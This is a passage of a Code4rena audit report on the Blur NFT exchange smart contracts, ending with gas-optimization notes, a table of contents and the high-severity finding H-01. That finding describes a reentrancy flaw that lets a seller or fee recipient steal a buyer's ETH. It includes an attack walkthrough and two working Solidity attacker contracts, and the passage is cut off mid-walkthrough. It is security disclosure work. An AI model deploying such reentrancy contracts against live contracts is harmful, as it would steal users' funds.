0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-11] Usage of uint/int smaller than 32 bytes (256 bits) incurs overhead</h2>\n<p>When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.<br>\nEach operation involving a uint8 costs an extra 22-28 gas (depending on whether the other operand is also a variable of type uint8) as compared to ones involving uint256, due to the compiler having to clear the higher bits of the memory word before operating on the uint8, as well as the associated stack operations of doing so. Use a larger size then downcast where needed.<br>\n<a href=\"https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html\">https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html</a><br>\nUse a larger size then downcast where needed.</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L84\">Exchange.sol#L84</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L307\">Exchange.sol#L307</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L443\">Exchange.sol#L443</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L479\">Exchange.sol#L479</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L519\">Exchange.sol#L519</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L598\">Exchange.sol#L598</a></li>\n</ul>\n<h2 id=\"g-12-bytes-constants-are-more-efficient-than-string-constants\" style=\"position:relative;\"><a href=\"#g-12-bytes-constants-are-more-efficient-than-string-constants\" aria-label=\"g 12 bytes constants are more efficient than string constants permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-12] Bytes constants are more efficient than string constants</h2>\n<p>If data can fit into 32 bytes, then you should use bytes32 datatype rather than bytes or strings as it is cheaper in solidity.</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L70\">Exchange.sol#L70</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L71\">Exchange.sol#L71</a></li>\n</ul>\n<h2 id=\"g-13-public-functions-not-called-by-the-contract-should-be-declared-external-instead\" style=\"position:relative;\"><a href=\"#g-13-public-functions-not-called-by-the-contract-should-be-declared-external-instead\" aria-label=\"g 13 public functions not called by the contract should be declared external instead permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-13] Public functions not called by the contract should be declared external instead</h2>\n<p>Contracts are allowed to override their parents’ functions and change the visibility from external to public and can save gas by doing so. </p>\n<p><code>withdraw</code></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Pool.sol#L44\">Pool.sol#L44</a></li>\n</ul>\n<p><code>transferFrom</code></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Pool.sol#L58\">Pool.sol#L58</a></li>\n</ul>\n<p><code>balanceOf</code></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Pool.sol#L79\">Pool.sol#L79</a></li>\n</ul>\n<p><code>totalSupply</code></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Pool.sol#L83\">Pool.sol#L83</a></li>\n</ul>\n<h2 id=\"g-14-should-use-arguments-instead-of-state-variable\" style=\"position:relative;\"><a href=\"#g-14-should-use-arguments-instead-of-state-variable\" aria-label=\"g 14 should use arguments instead of state variable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-14] Should use arguments instead of state variable</h2>\n<p>This will save near 97 gas</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L329\">Exchange.sol#L329</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L338\">Exchange.sol#L338</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L347\">Exchange.sol#L347</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L355\">Exchange.sol#L355</a></li>\n</ul>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-1\">High Risk Findings (1)</a></p>\n<ul>\n<li><a href=\"#h-01-direct-theft-of-buyers-eth-funds\">[H-01] Direct theft of buyer’s ETH funds</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-2\">Medium Risk Findings (2)</a></p>\n<ul>\n<li><a href=\"#m-01-yul-call-return-value-not-checked\">[M-01] Yul <code>call</code> return value not checked</a></li>\n<li><a href=\"#m-02-hacked-owner-or-malicious-owner-can-immediately-steal-all-assets-on-the-platform\">[M-02] Hacked owner or malicious owner can immediately steal all assets on the platform</a></li>\n<li><a href=\"#m-03-all-orders-which-use-expirationtime--0-to-support-oracle-cancellation-are-not-executable\">[M-03] All orders which use <code>expirationTime == 0</code> to support oracle cancellation are not executable</a></li>\n<li><a href=\"#m-04-pool-designed-to-be-upgradeable-but-does-not-set-owner-making-it-un-upgradeable\">[M-04] Pool designed to be upgradeable but does not set owner, making it un-upgradeable</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#low-risk-issues-list\">Low Risk Issues List</a></li>\n<li><a href=\"#non-critical-issues-list\">Non-Critical Issues List</a></li>\n<li><a href=\"#suggestions\">Suggestions</a></li>\n<li><a href=\"#l-01-potential-dos-in-contract-inheriting-uupsupgradeablesol\">L-01 Potential DOS in Contract Inheriting <code>UUPSUpgradeable.sol</code></a></li>\n<li><a href=\"#l-02--initialize-function-can-be-called-by-anybody\">L-02  initialize() function can be called by anybody</a></li>\n<li><a href=\"#l-03-the-whenopen-modifier-just-pauses-the-execute--and-bulkexecute-function\">L-03 The <code>whenOpen</code> modifier just pauses the <code>execute</code>  and <code>bulkExecute</code> function</a></li>\n<li><a href=\"#l-04--_returndust--function-create-dirty-bits\">L-04  <code>_returnDust</code>  function create dirty bits</a></li>\n<li><a href=\"#l-05-critical-address-changes-should-use-two-step-procedure\">L-05 Critical Address Changes Should Use Two-step Procedure</a></li>\n<li><a href=\"#l-06-owner-can-renounce-ownership\">L-06 Owner can renounce Ownership</a></li>\n<li><a href=\"#l-07-loss-of-precision-due-to-rounding\">L-07 Loss of precision due to rounding</a></li>\n<li><a href=\"#l-08-require-messages-are-too-short-and-unclear\">L-08 Require messages are too short and unclear</a></li>\n<li><a href=\"#l-09-fee-recipient-may-be-address0\">L-09 Fee recipient may be address(0)</a></li>\n<li><a href=\"#l-10-exchangesol--_execute-buyorderside-not-validated\">L-10 Exchange.sol  <code>_execute</code> buy.order.side not validated</a></li>\n<li><a href=\"#n-01-not-using-the-latest-version-of-openzeppelin-from-dependencies\">N-01 Not using the latest version of OpenZeppelin from dependencies</a></li>\n<li><a href=\"#n-02-no-same-value-input-control\">N-02 No same value input control</a></li>\n<li><a href=\"#n-03-0-address-check\">N-03 <code>0 address</code> check</a></li>\n<li><a href=\"#n-04-omissions-in-events\">N-04 Omissions in Events</a></li>\n<li><a href=\"#nc-05-add-parameter-to-event-emit\">NC-05 Add parameter to Event-Emit</a></li>\n<li><a href=\"#n-06-include-return-parameters-in-natspec-comments\">N-06 Include <code>return parameters</code> in <em>NatSpec comments</em></a></li>\n<li><a href=\"#n-07-solidity-compiler-optimizations-can-be-problematic\">N-07 Solidity compiler optimizations can be problematic</a></li>\n<li><a href=\"#n-08-natspec-is-missing\">N-08 NatSpec is missing</a></li>\n<li><a href=\"#n-09-signature-malleability-of-evms-ecrecover\">N-09 Signature Malleability of EVM’s ecrecover()</a></li>\n<li><a href=\"#n-10-lines-are-too-long\">N-10 Lines are too long</a></li>\n<li><a href=\"#n-11-stop-using-v--27--v--28-or-v--27--v--28\">N-11 Stop using <code>v != 27 &#x26;&#x26; v != 28 or v == 27 || v == 28</code></a></li>\n<li><a href=\"#n-12-empty-blocks-should-be-removed-or-emit-something\">N-12 <code>Empty blocks</code> should be <em>removed</em> or <em>Emit</em> something</a></li>\n<li><a href=\"#n-13-signature-scheme-does-not-support-smart-contracts\">N-13 Signature scheme does not support smart contracts</a></li>\n<li><a href=\"#s-01-generate-perfect-code-headers-every-time\">S-01 Generate perfect code headers every time</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#summary-1\">Summary</a></li>\n<li><a href=\"#g-01-multiple-addressid-mappings-can-be-combined-into-a-single-mapping-of-an-addressid-to-a-struct-where-appropriate\">G-01 Multiple address/ID mappings can be combined into a single mapping of an address/ID to a struct, where appropriate</a></li>\n<li><a href=\"#g-02-state-variables-can-be-packed-into-fewer-storage-slots\">G-02 State variables can be packed into fewer storage slots</a></li>\n<li><a href=\"#g-03-add-unchecked--for-subtractions-where-the-operands-cannot-underflow-because-of-a-previous-require-or-if-statement\">G-03 Add <code>unchecked {}</code> for subtractions where the operands cannot underflow because of a previous <code>require()</code> or <code>if</code> statement</a></li>\n<li><a href=\"#g-04-x--y-costs-more-gas-than-x--x--y-for-state-variables\">G-04 <code>&#x3C;x> += &#x3C;y></code> costs more gas than <code>&#x3C;x> = &#x3C;x> + &#x3C;y></code> for state variables</a></li>\n<li><a href=\"#g-05-not-using-the-named-return-variables-when-a-function-returns-wastes-deployment-gas\">G-05 Not using the named return variables when a function returns, wastes deployment gas</a></li>\n<li><a href=\"#g-06-can-make-the-variable-outside-the-loop-to-save-gas\">G-06 Can make the variable outside the loop to save gas</a></li>\n<li><a href=\"#g-07-ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-as-is-the-case-when-used-in-for-loop-and-while-loops\">G-07 <code>++i/i++</code> should be <code>unchecked{++i}/unchecked{i++}</code> when it is not possible for them to overflow, as is the case when used in for-loop and while-loops</a></li>\n<li><a href=\"#g-08-requirerevert-strings-longer-than-32-bytes-cost-extra-gas\">G-08 <code>require()</code>/<code>revert()</code> strings longer than 32 bytes cost extra gas</a></li>\n<li><a href=\"#g-09-require-or-revert-statements-that-check-input-arguments-should-be-at-the-top-of-the-function\">G-09 <code>require()</code> or <code>revert()</code> statements that check input arguments should be at the top of the function</a></li>\n<li><a href=\"#g-10-internal-functions-only-called-once-can-be-inlined-to-save-gas\">G-10 Internal functions only called once can be inlined to save gas</a></li>\n<li><a href=\"#g-11-usage-of-uintint-smaller-than-32-bytes-256-bits-incurs-overhead\">G-11 Usage of uint/int smaller than 32 bytes (256 bits) incurs overhead</a></li>\n<li><a href=\"#g-12-bytes-constants-are-more-efficient-than-string-constants\">G-12 Bytes constants are more efficient than string constants</a></li>\n<li><a href=\"#g-13-public-functions-not-called-by-the-contract-should-be-declared-external-instead\">G-13 Public functions not called by the contract should be declared external instead</a></li>\n<li><a href=\"#g-14-should-use-arguments-instead-of-state-variable\">G-14 Should use arguments instead of state variable</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>",
  "md": "\n# Overview\n\n## About C4\n\nCode4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.\n\nA C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\n\nDuring the audit contest outlined in this document, C4 conducted an analysis of the Blur smart contract system written in Solidity. The audit contest took place between November 11—November 14 2022.\n\n*Note: this audit contest originally ran under the name `Non Fungible Trading`.*\n\n## Wardens\n\n63 Wardens contributed reports to the Blur contest:\n\n1. [Trust](https://twitter.com/trust__90)\n1. cccz\n1. [adriro](https://github.com/romeroadrian)\n1. hihen\n1. [0xSmartContract](https://twitter.com/0xSmartContract)\n1. wait\n1. IllIllI\n1. [bin2chen](https://twitter.com/bin2chen)\n1. [philogy](https://twitter.com/real_philogy)\n1. ladboy233\n1. 9svR6w\n1. [joestakey](https://twitter.com/JoeStakey)\n1. 0xdeadbeef0x\n1. 0xhacksmithh\n1. Josiah\n1. zaskoh\n1. Rolezn\n1. [deliriusz](https://rafal-kalinowski.pl/)\n1. V\\_B (Barichek and vlad_bochok)\n1. ReyAdmirado\n1. [0xDecorativePineapple](https://decorativepineapple.github.io/)\n1. neko_nyaa\n1. KingNFT\n1. Lambda\n1. Koolex\n1. fs0c\n1. rotcivegaf\n1. datapunk\n1. 0x4non\n1. brgltd\n1. [aviggiano](https://twitter.com/agfviggiano)\n1. [carlitox477](https://twitter.com/CAA1994)\n1. saian\n1. chaduke\n1. codexploder\n1. [s3cunda](s3cunda.github.io)\n1. corerouter\n1. RaymondFam\n1. [martin](https://github.com/martin-petrov03)\n1. trustindistrust\n1. [Aymen0909](https://github.com/Aymen1001)\n1. [c3phas](https://twitter.com/c3ph_)\n1. ajtra\n1. HE1M\n1. chrisdior4\n1. Tricko\n1. tnevler\n1. [0xNazgul](https://twitter.com/0xNazgul)\n1. Bnke0x0\n1. 0xab00\n1. aphak5010\n1. erictee\n1. cryptostellar5\n1. shark\n1. [Rahoz](https://www.linkedin.com/in/nhan-vo-a9473019a/)\n1. Diana\n1. Awesome\n1. ch0bu\n1. [Sathish9098](https://www.linkedin.com/in/sathishkumar-p-26069915a)\n1. [0xRoxas](https://twitter.com/0xRoxas)\n1. lukris02\n1. [Deivitto](https://twitter.com/Deivitto)\n\nThis contest was judged by [berndartmueller](https://twitter.com/berndartmueller).\n\nFinal report assembled by [sock](https://twitter.com/sockdrawermoney) and [liveactionllama](https://twitter.com/liveactionllama).\n\n# Summary\n\nThe C4 analysis yielded an aggregated total of 5 unique vulnerabilities. Of these vulnerabilities, 1 received a risk rating in the category of HIGH severity and 4 received a risk rating in the category of MEDIUM severity.\n\nAdditionally, C4 analysis included 21 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 29 reports recommending gas optimizations.\n\nAll of the issues presented here are linked back to their original finding.\n\n# Scope\n\nThe code under review can be found within the [C4 Blur Exchange contest repository](https://github.com/code-423n4/2022-11-non-fungible), and is composed of 2 smart contracts written in the Solidity programming language and includes 659 lines of Solidity code.\n\n# Severity Criteria\n\nC4 assesses the severity of disclosed vulnerabilities according to a methodology based on [OWASP standards](https://owasp.org/www-community/OWASP_Risk_Rating_Methodology).\n\nVulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.\n\nHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\n\n- Malicious Input Handling\n- Escalation of privileges\n- Arithmetic\n- Gas use\n\nFurther information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com).\n\n***\n\n# High Risk Findings (1)\n## [[H-01] Direct theft of buyer’s ETH funds](https://github.com/code-423n4/2022-11-non-fungible-findings/issues/96)\n*Submitted by 0xdeadbeef0x, also found by adriro, bin2chen, datapunk, hihen, KingNFT, Koolex, Lambda, philogy, rotcivegaf, Trust, V\\_B, and wait*\n\n[Exchange.sol#L168](https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L168)<br>\n[Exchange.sol#L565](https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L565)<br>\n[Exchange.sol#L212](https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L212)<br>\n[Exchange.sol#L154](https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L154)<br>\n\nMost severe issue:<br>\n**A Seller or Fee recipient can steal ETH funds from the buyer when he is making a single or bulk execution. (Direct theft of funds).**\n\nAdditional impacts that can be caused by these bugs:\n1. Seller or Fee recipient can cause next in line executions to revert in `bulkExecute` (by altering `isInternal`, insufficient funds, etc..)\n2. Seller or Fee recipient can call `_execute` externally \n3. Seller or Fee recipient can set a caller `_remainingETH` to 0 (will not get refunded)\n\n### Proof of Concept\n\nBackground:\n* The protocol added a `bulkExecute` function that allows multiple orders to execute. The implementation is implemented in a way that if an `_execute` of a single order reverts, it will not break additional or previous successful `_execute`s. It is therefore very important to track actual ETH used by the function. \n* The protocol has recognized the need to track buyers ETH in order to refund unused ETH by implementing the `_returnDust` function and `setupExecution` modifier. This ensures that calls to `_execute` must be internal and have proper accounting of remainingETH. \n* Fee recipient is controlled by the seller. The seller determines the recipients and fee rates.\n\nThe new implementations creates an attack vectors that allows the Seller or Fee recipient to steal ETH.\n\nThere are three main bugs that can be exploited to steal the ETH:\n1. Reentrancy is possible by feeRecipient as long as `_execute` is not called (`_execute` has a reentrancyGuard)\n2. `bulkExecute` can be called with an empty parameter. This allows the caller to not enter `_execute` and call `_returnDust`\n3. `_returnDust` sends the entire balance of the contract to the caller.\n\n(Side note: I issued the 3 bugs together in this one report in order to show impact and better reading experience for sponsor and judge. If you see fit, these three bugs can be split to three different findings)\n\nThere are two logical scenarios where the heist could originate from:\n1. Malicious seller: The seller can set the fee recipient to a malicious contract.\n2. Malicious fee recipient: fee recipient can steal the funds without the help of the seller. \n\nConsider the scenario (`#1`) where feeRecipient rate 10% of token price 1 ETH:\n1. Bob (Buyer) wants to execute 4 orders with ETH. Among the orders is Alice's (seller) sell order (lets assume first in line).\n2. Bob calls `bulkExecute` with `4 ETH`. `1 ETH` for every order. \n3. Alice's sell order gets executed. Fee  `0.1 ETH` is sent to feeRecipient (controlled by Alice).\n4. feeRecipient *reenters* `bulkExecute` with *empty* array as parameter and `1 WEI` of data\n5. `_returnDust` returns the balance of the contract to feeRecipient `3.9 ETH`.\n6. feeRecipient sends `3.1 ETH` to seller (or any other beneficiary)\n7. feeRecipient call `selfdestruct` opcode that transfers `0.9 ETH` to Exchange contract. This is in order to keep `_execute` from reverting when paying the seller.\n8. `_execute` pays seller  `0.9 ETH` \n9. Sellers balance is `4 ETH`. \n10. The rest of the `_execute` calls by `bulkExecute` will get reverted because buyer cannot pay as his funds were stolen.\n11. Buyers `3 ETH` funds stolen\n\n```\n┌───────────┐            ┌──────────┐         ┌───────────────┐    ┌───────────┐\n│           │            │          │         │               │    │           │\n│   Buyer   │            │ Exchange │         │ Fee Recipient │    │  Seller   │\n│           │            │          │         │               │    │           │\n└─────┬─────┘            └────┬─────┘         └───────┬───────┘    └─────┬─────┘\n      │                       │                       │                  │\n      │ bulkExecute(4 orders) │                       │                  │\n      │         4 ETH         │                       │                  │\n      ├──────────────────────►│                       │                  │\n      │                       │_execute sends 0.1 ETH │                  │\n      │                       ├──────────────────────►│                  │\n      │                       │                       │                  │\n      │                       │ bulkExecute(0 orders) │                  │\n      │                       │         1 WEI         │                  │\n      │                       │◄──────────────────────┤                  │\n      │                       │                       │                  │\n      │                       │    _retrunDust sends  │                  │\n      │                       │         3.9 ETH       │                  │\n      │                       ├──────────────────────►│  Send 3.1 ETH    │\n      │                       │                       ├─────────────────►│\n      │                       │ Self destruct send    │                  │\n      │                       │         0.9 ETH       │                  │\n      │                       │◄──────────────────────┤                  │\n      │                       │                       │                  │\n      │                       │_execute sends 0.9 ETH │                  │\n      │                       ├───────────────────────┼─────────────────►│\n      │                       │                       │                  │\n      │                       ├──────┐ _execute revert│                  │\n      │                       │      │     3 times    │                  │\n  ┌───┴───┐                   │◄─────┘                │              ┌───┴───┐\n  │3 ETH  │                   │                       │              │4 ETH  │\n  │Stolen │                                                          │Balance│\n  └───────┘                                                          └───────┘\n```\n\nHere is a possible implementation of the fee recipient contract:\n```\ncontract MockFeeReceipient {\n\n    bool lock;\n    address _seller;\n    uint256 _price;\n\n    constructor(address seller, uint256 price) {\n        _seller = seller;\n        _price = price;\n    }\n    receive() external payable {\n        Exchange ex = Exchange(msg.sender);\n        if(!lock){\n            lock = true;\n            // first entrance when receiving fee\n            uint256 feeAmount = msg.value;\n            // Create empty calldata for bulkExecute and call it\n            Execution[] memory executions = new Execution[](0);\n            bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);\n            address(ex).call{value: 1}(data);\n\n            // Now we received All of buyers funds. \n            // Send stolen ETH to seller minus the amount needed in order to keep execution.\n            address(_seller).call{value: address(this).balance - (_price - feeAmount)}('');\n\n            // selfdestruct and send funds needed to Exchange (to not revert)\n            selfdestruct(payable(msg.sender));\n        }\n        else{\n            // Second entrance after steeling balance\n            // We will get here after getting funds from reentrancy\n        }\n    }\n}\n```\n\nImportant to know:\nThe exploit becomes much easier if the set fee rate is 10000 (100% of the price). This can be set by the seller. In such case, the fee recipient does not need to send funds back to the exchange contract. In such case, step #7-8 can be removed. Example code for 100% fee scenario:\n\n```\npragma solidity 0.8.17;\n\nimport { Exchange } from \"../Exchange.sol\";\nimport { Execution } from \"../lib/OrderStructs.sol\";\n\ncontract MockFeeReceipient {\n\n    bool lock;\n    address _seller;\n    uint256 _price;\n    \n    constructor(address seller, uint256 price) {\n        _seller = seller;\n        _price = price;\n    }\n    receive() external payable {\n        Exchange ex = Exchange(msg.sender);\n        if(!lock){\n            lock = true;\n            // first entrance when receiving fee\n            uint256 feeAmount = msg.value;\n            // Create empty calldata for bulkExecute and call it\n            Execution[] memory executions = new Execution[](0);\n            bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);\n            address(ex).call{value: 1}(data);\n        }\n        else{\n            // Second entrance after steeling balance\n            // We will get here after getting funds from reentrancy\n        }\n    }\n}\n```\n\nIn the POC we talk mostly about `bulkExecute` but `execute` of a single execution can steal the buyers excessive ETH.\n\n### Technical Walkthrough of Scenario\n\nBuyers can call `execute` or `bulkExecute` to start an execution of orders.<br>\nBoth functions have a `setupExecution` modifier that stores the amount of ETH the caller has sent for the transactions:\n\n`bulkExecute` in `Exchange.sol`:\nhttps://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L168\n```\n    function bulkExecute(Execution[] calldata executions)\n        external\n        payable\n        whenOpen\n        setupExecution\n    {\n```\n\n`setupExecution`:\nhttps://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L40\n```\n    modifier setupExecution() {\n        remainingETH = msg.value;\n        isInternal = true;\n        _;\n        